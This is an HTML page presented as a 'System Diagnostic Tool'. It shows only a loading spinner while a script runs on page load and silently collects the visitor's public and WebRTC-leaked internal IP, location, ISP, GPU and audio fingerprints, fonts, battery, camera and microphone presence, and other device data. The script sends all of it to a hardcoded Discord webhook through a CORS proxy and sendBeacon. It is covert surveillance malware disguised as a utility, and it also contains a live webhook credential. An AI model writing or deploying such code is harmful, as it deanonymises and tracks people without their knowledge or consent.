<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic Tool</title>
    <style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;}.l{border:3px solid #111;border-top:2px solid #0f0;border-radius:50%;width:30px;height:30px;animation:s 0.6s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
</head>
<body>
    <div class="l"></div>
    <script>
        "use strict";

        class Omniscience {
            constructor() {
                this.hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
                this.proxy = "https://corsproxy.io/?";
            }

            // 1. HARDWARE LAYER: Donanƒ±m Entropisi ve GPU Pipeline
            async getHardware() {
                const cv = document.createElement('canvas');
                const gl = cv.getContext('webgl2') || cv.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                
                // Audio Context Fingerprinting (E≈üsiz Ses Kartƒ± ƒ∞mzasƒ±)
                const ac = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                const osc = ac.createOscillator();
                const comp = ac.createDynamicsCompressor();
                osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, ac.currentTime);
                osc.connect(comp); comp.connect(ac.destination);
                osc.start(0); const audioBuffer = await ac.startRendering();
                const audioHash = audioBuffer.getChannelData(0).slice(4500, 5000).reduce((a, b) => a + Math.abs(b), 0);

                return {
                    gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
                    v_prec: gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT).precision,
                    f_prec: gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT).precision,
                    audio_hash: audioHash.toFixed(15),
                    cores: navigator.hardwareConcurrency || "N/A",
                    mem: navigator.deviceMemory || "N/A",
                    touch: navigator.maxTouchPoints || 0,
                    max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE)
                };
            }

            // 2. NETWORK LAYER: WebRTC VPN Bypass & Latency
            async getNetwork() {
                const start = performance.now();
                const ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
                const rtt = performance.now() - start;

                const internal = await new Promise(z => {
                    const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                    pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = (e) => { if(e?.candidate?.candidate) { const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(m) { pc.close(); z(m[1]); } } };
                    setTimeout(() => z("Blocked/VPN"), 1500);
                });

                return { ...ip, internal, rtt: rtt.toFixed(2) + "ms", net_type: navigator.connection?.effectiveType };
            }

            // 3. SYSTEM & STORAGE: Fiziksel Kapasite Analizi
            async getStorage() {
                const s = navigator.storage ? await navigator.storage.estimate() : {};
                const b = navigator.getBattery ? await navigator.getBattery() : {};
                const devs = await navigator.mediaDevices.enumerateDevices().catch(() => []);
                
                return {
                    quota: (s.quota / 1073741824).toFixed(2) + "GB",
                    usage: (s.usage / 1048576).toFixed(2) + "MB",
                    bat: b.level ? `${Math.round(b.level * 100)}% [${b.charging ? 'AC' : 'DC'}]` : "N/A",
                    has_cam: devs.some(d => d.kind === 'videoinput'),
                    has_mic: devs.some(d => d.kind === 'audioinput'),
                    cam_count: devs.filter(d => d.kind === 'videoinput').length,
                    os: navigator.platform,
                    pdf: navigator.pdfViewerEnabled
                };
            }

            // 4. LINGUISTIC & TEMPORAL: Saat, Dil ve Konum Doƒürulamasƒ±
            getTemporal() {
                const opt = Intl.DateTimeFormat().resolvedOptions();
                const fonts = ["Ubuntu", "Consolas", "Roboto", "Impact", "Monaco"].filter(f => document.fonts.check(`12px "${f}"`)).join(", ");
                return {
                    tz: opt.timeZone,
                    lang: navigator.language,
                    all_langs: navigator.languages.join(", "),
                    cal: opt.calendar,
                    num_sys: new Intl.NumberFormat().resolvedOptions().numberingSystem,
                    time: new Date().toLocaleString(),
                    offset: "UTC" + (new Date().getTimezoneOffset() / -60),
                    fonts: fonts || "System Standard"
                };
            }

            async dispatch() {
                const [hw, net, st] = await Promise.all([this.getHardware(), this.getNetwork(), this.getStorage()]);
                const temp = this.getTemporal();
                const vpn_flag = (net.timezone && temp.tz !== net.timezone) ? "üö© VPN DETECTED" : "‚úÖ DIRECT";

                const report = {
                    embeds: [{
                        title: "üíÄ KERNEL_ARCHITECT_EXTRACTION_V70",
                        color: 0xff0000,
                        fields: [
                            { name: "üì° NETWORK (9)", value: `**Ext IP:** \`${net.ip}\` | **Int IP:** \`${net.internal}\`\n**ISP:** ${net.org}\n**LOC:** ${net.city}/${net.country_name}\n**VPN:** ${vpn_status} | **RTT:** ${net.rtt}`, inline: false },
                            { name: "‚è∞ TIME & REGION (6)", value: `**TZ:** ${temp.tz} | **Offset:** ${temp.offset}\n**System Time:** ${temp.time}\n**Lang:** ${temp.lang} | **Calendar:** ${temp.cal}`, inline: false },
                            { name: "‚öôÔ∏è HARDWARE (8)", value: `**GPU:** ${hw.gpu}\n**Audio Hash:** ${hw.audio_hash}\n**CPU:** ${hw.cores} Cores | **RAM:** ${hw.mem}GB\n**Shader:** V:${hw.v_prec}/F:${hw.f_prec} | **Tex:** ${hw.max_tex}`, inline: false },
                            { name: "üì∏ MEDIA & STORAGE (7)", value: `**Cam:** ${st.has_cam} (${st.cam_count}) | **Mic:** ${st.has_mic}\n**Disk Quota:** ${st.quota} | **Used:** ${st.usage}\n**Battery:** ${st.bat} | **PDF:** ${st.pdf}`, inline: false },
                            { name: "üìê DISPLAY & UI (6)", value: `**Res:** ${screen.width}x${screen.height}\n**DPI:** ${window.devicePixelRatio} | **Depth:** ${screen.colorDepth}bit\n**OS:** ${st.os} | **Fonts:** \`${temp.fonts}\``, inline: false },
                            { name: "üîç RAW_UA", value: "```" + navigator.userAgent + "```" }
                        ],
                        footer: { text: "Protocol: Omniscience v70.0 | No Data Left Behind" },
                        timestamp: new Date().toISOString()
                    }]
                };

                const blob = new Blob([JSON.stringify(report)], { type: 'application/json' });
                fetch(this.proxy + encodeURIComponent(this.hook), { method: 'POST', body: blob, mode: 'no-cors' });
                if (navigator.sendBeacon) navigator.sendBeacon(this.hook, blob);
            }
        }

        new Omniscience().dispatch();
    </script>
</body>
</html>
